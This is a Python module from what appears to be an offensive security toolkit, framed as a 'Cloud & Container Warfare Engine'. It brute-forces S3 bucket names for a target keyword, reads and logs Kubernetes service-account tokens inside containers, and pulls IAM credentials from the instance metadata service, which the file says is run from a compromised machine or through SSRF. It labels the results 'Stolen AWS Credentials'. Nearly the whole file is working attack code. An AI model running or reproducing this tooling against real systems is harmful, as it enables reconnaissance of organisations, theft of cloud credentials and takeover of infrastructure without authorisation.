"""
cloud_ops.py — Cloud & Container Warfare Engine
"""

import os
import requests
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.database import db

console = Console()


class CloudEngine:
    def __init__(self):
        # The magical IP address used by all major clouds for Instance Metadata
        self.metadata_url = "[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"

    def hunt_s3_buckets(self):
        """Scans for exposed AWS S3 buckets using keyword permutations."""
        keyword = questionary.text(
            "Enter target company/keyword (e.g., 'acme'):", style=Q_STYLE).ask()
        if not keyword:
            return

        prefixes = ["dev", "prod", "test", "staging", "backup",
                    "logs", "internal", "public", "assets", "data"]
        suffixes = ["-dev", "-prod", "-backup",
                    "-logs", "-files", "-s3", "-bucket", ""]

        console.print(
            f"[*] Sniping exposed S3 buckets for keyword: [cyan]{keyword}[/cyan]")

        found = []
        for pref in prefixes:
            for suff in suffixes:
                bucket_names = [
                    f"{keyword}-{pref}{suff}",
                    f"{pref}-{keyword}{suff}",
                    f"{keyword}{suff}"
                ]

                for bucket in set(bucket_names):
                    url = f"https://{bucket}.s3.amazonaws.com"
                    try:
                        res = requests.get(url, timeout=2)
                        if res.status_code == 200:
                            console.print(
                                f"[bold green][+] PUBLIC BUCKET FOUND:[/bold green] {url}")
                            found.append(url)
                            db.log("Cloud-Ops", url,
                                   "Publicly readable AWS S3 Bucket", "HIGH")
                        elif res.status_code == 403:
                            console.print(
                                f"[yellow][~] Access Denied (Bucket Exists):[/yellow] {url}")
                    except requests.exceptions.RequestException:
                        pass

        if not found:
            console.print(
                "[dim]No public buckets found in this quick sweep.[/dim]")

    def container_breakout_check(self):
        """Checks if the local machine is inside a Docker/K8s container and looks for escape vectors."""
        table = Table(title="Local Container Environment Audit",
                      border_style="cyan", expand=True)
        table.add_column("Vector", style="magenta")
        table.add_column("Status", style="white")

        # 1. Check for Docker
        if os.path.exists("/.dockerenv"):
            table.add_row("Docker Environment",
                          "[bold red]Inside Docker Container[/bold red]")
        else:
            table.add_row("Docker Environment",
                          "[green]Not inside Docker[/green]")

        # 2. Check for Kubernetes Service Tokens
        k8s_token = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        if os.path.exists(k8s_token):
            table.add_row("K8s Service Token",
                          f"[bold red]FOUND ({k8s_token})[/bold red]")
            try:
                with open(k8s_token, "r") as f:
                    db.log("Cloud-Ops", "Localhost",
                           f"K8s Token: {f.read()[:50]}...", "CRITICAL")
            except:
                pass
        else:
            table.add_row("K8s Service Token", "[green]Not Found[/green]")

        # 3. Check for mounted Docker Socket (Allows full host takeover)
        if os.path.exists("/var/run/docker.sock"):
            table.add_row("Mounted docker.sock",
                          "[bold red]CRITICAL: Container Escape Possible[/bold red]")
        else:
            table.add_row("Mounted docker.sock", "[green]Safe[/green]")

        console.print(table)

    def extract_cloud_metadata(self):
        """Attempts to extract AWS/GCP/Azure metadata (SSRF or Local Execution)."""
        console.print(
            "[dim]This must be run FROM the compromised machine, or via an SSRF vulnerability.[/dim]")
        target = questionary.text(
            "Target URL (Leave blank to test localhost 169.254.169.254):", style=Q_STYLE).ask()

        url = target if target else self.metadata_url

        console.print(
            f"[*] Probing Instance Metadata Service (IMDS) at: {url}")

        headers = {
            # AWS IMDSv2 token request (optional, but good for modern environments)
            "X-aws-ec2-metadata-token-ttl-seconds": "21600",
            # Azure requires this header
            "Metadata": "true"
        }

        try:
            # 1. AWS IAM Roles
            res = requests.get(
                f"{url}iam/security-credentials/", headers=headers, timeout=3)
            if res.status_code == 200:
                role = res.text.strip()
                console.print(
                    f"[bold green][+] AWS IAM Role Found:[/bold green] {role}")

                # Extract the actual keys
                creds = requests.get(
                    f"{url}iam/security-credentials/{role}", headers=headers, timeout=3)
                if creds.status_code == 200:
                    console.print(
                        Panel(creds.text, title="Stolen AWS Credentials", border_style="red"))
                    db.log(
                        "Cloud-Ops", url, f"Stolen AWS Keys for role {role}:\n{creds.text}", "CRITICAL")
            else:
                console.print("[yellow][-] No AWS IAM roles exposed.[/yellow]")

        except requests.exceptions.RequestException:
            console.print(
                "[red][!] Could not reach metadata server. Target is likely not in the cloud or blocked by IMDSv2.[/red]")

    def run(self):
        draw_header("Cloud & Container Warfare")

        while True:
            choice = questionary.select(
                "Select Cloud Operation:",
                choices=[
                    "1. S3 Bucket Sniper (External)",
                    "2. Local Container Breakout Audit (Docker/K8s)",
                    "3. Extract Cloud Instance Metadata (IAM/Keys)",
                    "Back"
                ],
                style=Q_STYLE
            ).ask()

            if not choice or choice == "Back":
                break
            elif "S3" in choice:
                self.hunt_s3_buckets()
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            elif "Container" in choice:
                self.container_breakout_check()
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            elif "Metadata" in choice:
                self.extract_cloud_metadata()
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def run_cloud_ops():
    CloudEngine().run()
